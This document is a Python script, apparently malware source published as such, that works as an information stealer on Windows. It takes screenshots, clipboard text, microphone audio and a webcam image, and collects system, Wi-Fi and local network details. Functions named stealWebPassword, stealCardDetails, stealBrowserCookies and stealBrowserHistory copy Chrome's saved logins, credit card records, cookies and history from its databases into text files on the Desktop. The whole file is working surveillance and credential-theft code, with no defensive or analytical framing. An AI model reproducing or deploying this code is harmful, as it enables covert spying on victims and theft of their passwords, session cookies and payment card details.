# SHHH! XIT WAS HERE
import subprocess
import platform
import psutil
import os
import pyautogui
import time
import cv2
import pyperclip
import pyaudio
import wave
import psutil
import webbrowser
import sqlite3
import win32crypt



def get_system_info():
    """Collect system information and return it as a dictionary."""
    info = {
        "os": platform.system(),
        "hostname": platform.node(),
        "username": os.getlogin(),
        "cpu": platform.processor(),
        "memory": psutil.virtual_memory().total / (1024 ** 3),
    }
    return info

def get_network_info():
    """Collect network information and return it as a dictionary."""
    net_io = psutil.net_io_counters()
    info = {
        "bytes_sent": net_io.bytes_sent,
        "bytes_recv": net_io.bytes_recv,
        "packets_sent": net_io.packets_sent,
        "packets_recv": net_io.packets_recv,
    }
    return info

# Wi-Fi Information

def get_wifi_info():
    """Collect information about the Wi-Fi network and available devices."""
    try:
        result = subprocess.check_output(["netsh", "wlan", "show", "network"])
        result = result.decode("utf-8")
        lines = result.split("\n")
        ssids = []
        for line in lines:
            if "SSID" in line:
                ssids.append(line.split(":")[1].strip())
        return {"connected_ssid": ssids[0], "available_ssids": ssids[1:]}
    except:
        return {"error": "Could not retrieve Wi-Fi information"}

def get_network_devices():
    """Collect information about the devices connected to the network."""
    try:
        result = subprocess.check_output(["arp", "-a"])
        result = result.decode("utf-8")
        lines = result.split("\n")
        devices = []
        for line in lines:
            if "dynamic" in line:
                devices.append(line.split(" ")[0])
        return {"devices": devices}
    except:
        return {"error": "Could not retrieve network devices information"}

#Capture Screenshots and Text from the clipboard

def steal_information():
    # Take a screenshot of the current screen
    screenshot = pyautogui.screenshot()
    file_path = os.path.join(os.path.expanduser("~/Desktop/screenshots"), "screenshot.png")
    screenshot.save(file_path)

    # Get all text from the clipboard
    pyautogui.hotkey('ctrl', 'a')
    # clipboard_text = pyautogui.hotkey('ctrl', 'c')
    pyautogui.hotkey('esc')

    # Write the stolen information to a file
    clipboard_text = pyperclip.paste()
    file_path2 = os.path.join(os.path.expanduser("~/Desktop/screenshots"), "stolen_information.txt")
    with open(file_path2, 'w',encoding='utf-8') as f:
        f.write(f'Clipboard text: {clipboard_text}')

# Capture Audio from Microphone
def capture_audio(record_seconds, wave_output_filename):
    # Set the parameters for the audio recording
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    RATE = 44100

    # Start the PyAudio library
    p = pyaudio.PyAudio()

    # Start the stream for recording
    stream = p.open(format=FORMAT,
                    channels=CHANNELS,
                    rate=RATE,
                    input=True,
                    frames_per_buffer=CHUNK)

    # Start the recording
    print("Recording audio...")
    frames = []
    for i in range(0, int(RATE / CHUNK * record_seconds)):
        data = stream.read(CHUNK)
        frames.append(data)
    print("Recording finished.")

    # Stop the stream and close the PyAudio library
    stream.stop_stream()
    stream.close()
    p.terminate()

    # Save the recording as a WAV file
    wf = wave.open(wave_output_filename, 'wb')
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(p.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()


#CAPTURE IMAGE FROM WEBCAM

def capture_image_from_webcam():
    # Start the webcam
    cap = cv2.VideoCapture(0)

    # Check if the webcam is opened
    if not cap.isOpened():
        print("Webcam not found.")
        exit()

    # Read a frame from the webcam
    ret, frame = cap.read()

    # Check if a frame was successfully captured
    if not ret:
        print("Could not read a frame from the webcam.")
        exit()

    # Save the frame as an image file
    image_file = os.path.join(os.path.expanduser("~/Desktop/screenshots"), "cap.jpg")
    cv2.imwrite(image_file, frame)

    # Release the webcam
    cap.release()

# Open URL IN WEB BROWSER

def open_url(url):
    try:
        # Open the URL in the default browser
        webbrowser.open(url)
        print("Browser opened successfully")
    except Exception as e:
        print("Error: Failed to open browser")
        print("Error message: ", e)

#Get all Passwords from browser

def stealWebPassword():
    # Location of the user's Chrome password database
    db_path = os.path.expanduser(os.environ['LocalAppData'] + '\\Google\\Chrome\\User Data\\Default\\Login Data')

    # Connect to the database
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()

    # Execute a SQL query to retrieve encrypted passwords
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")

    # Open a text file to write the results
    pass_path = os.path.join(os.path.expanduser("~/Desktop/screenshots"), "passwords.txt")
    with open(pass_path, "w",  encoding='utf-8') as f:
        # Decrypt the passwords
        for links, user_name, pwd in cursor.fetchall():
            ###pwd = win32crypt.CryptUnprotectData(pwd)
            f.write("Website: {}\nUsername: {}\nPassword: {}\n".format(links, user_name, pwd))

    # Clean up
    cursor.close()
    conn.close()

#Get CARD DETAILS from Browser

def stealCardDetails():
    # Location of the user's Chrome credit_cards database
    db_path = os.path.expanduser(os.environ['LocalAppData'] + '\\Google\\Chrome\\User Data\\Default\\Web Data')

    # Connect to the database
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()

    # Execute a SQL query to retrieve encrypted credit_cards
    cursor.execute("SELECT * FROM credit_cards")

    # Open a text file to write the results
    card_path = os.path.join(os.path.expanduser("~/Desktop/screenshots"), "cards.txt")
    with open(card_path, "w") as f:
        for result in cursor.fetchall():
            f.write("CCN: {}\nEXP yr: {}\nEXP mo: {}\nNAME: {}\n".format(result[4], result[3], result[2],result[1]))

    # Clean up
    cursor.close()
    conn.close()

#Get BROWSER COOKIES

def stealBrowserCookies():
    # Location of the user's Chrome cookies database
    db_path = os.path.expanduser(os.environ['LocalAppData'] + '\\Google\\Chrome\\User Data\\Default\\Cookies')

    # Connect to the database
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()

    # Execute a SQL query to retrieve encrypted cookies
    try:
        cursor.execute("SELECT * FROM cookies")
    except sqlite3.OperationalError as e:
        if "no such table: cookies" in str(e):
            print("Table not found, ignoring error.")
        else:
            raise e


    # Open a text file to write the results
    cookie_path = os.path.join(os.path.expanduser("~/Desktop/screenshots"), "cookies.txt")
    with open(cookie_path, "w") as f:
        for result in cursor.fetchall():
            f.write("Host: {}\nName: {}\nPath: {}\nExpiry: {}\nIsSecure: {}\nValue: {}\n".format(result[1], result[2], result[3], result[4], bool(result[5]), result[6]))

    # Clean up
    cursor.close()
    conn.close()

#Get BROWSER HISTORY

def stealBrowserHistory():
    # Location of the user's Chrome history database
    db_path = os.path.expanduser(os.environ['LocalAppData'] + '\\Google\\Chrome\\User Data\\Default\\History')

    # Connect to the database
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()

    # Execute a SQL query to retrieve history
    cursor.execute("SELECT * FROM urls")

    # Open a text file to write the results
    history_path = os.path.join(os.path.expanduser("~/Desktop/screenshots"), "history.txt")
    with open(history_path, "w", encoding='utf-8') as f:
        for result in cursor.fetchall():
            f.write("Host: {}\nTitle: {}\nVisits: {}\n".format(result[1], result[2], result[3]+1))

    # Clean up
    cursor.close()
    conn.close()


if __name__ == '__main__':
    if not os.path.exists(os.path.join(os.path.join(os.path.expanduser("~/Desktop")), "screenshots")):
        os.makedirs(os.path.join(os.path.join(os.path.expanduser("~/Desktop")), "screenshots"))

    network_info = get_network_info()
    print("Network Information\n")
    print("Bytes sent: ", network_info['bytes_sent'])
    print("Bytes received: ", network_info['bytes_recv'])
    print("Packets sent: ", network_info['packets_sent'])
    print("Packets received: ", network_info['packets_recv'])
    print("\nSystem Information \n",get_system_info())

    print("\n Get Wi-Fi Information")
    wifi_info = get_wifi_info()
    if "error" in wifi_info:
        print(wifi_info["error"])
    else:
        print("Connected to SSID: ", wifi_info['connected_ssid'])
        print("Available SSIDs: ", wifi_info['available_ssids'])
    network_devices = get_network_devices()
    if "error" in network_devices:
        print(network_devices["error"])
    else:
        print("Devices connected to network: ", network_devices['devices'])
    
    # Continuously steal screwwnshort and clipboard every 5 seconds
    steal_information()

    #Capture Audio from Microphone
    record_seconds = 3
    wave_output_filename = os.path.join(os.path.expanduser("~/Desktop/screenshots"), "recording.wav")
    capture_audio(record_seconds, wave_output_filename)

    #Capture Image from Webcam
    capture_image_from_webcam()

    #Get all Passwords from browser
    stealWebPassword()

    #Get CARD DETAILS from Browser
    stealCardDetails()

    #Get BROWSER COOKIES
    stealBrowserCookies()

    #Get BROWSER HISTORY
    stealBrowserHistory()

    # Open URL IN WEB BROWSER
    time.sleep(5)
    url = "https://github.com/Anonymous3017"
    # open_url(url)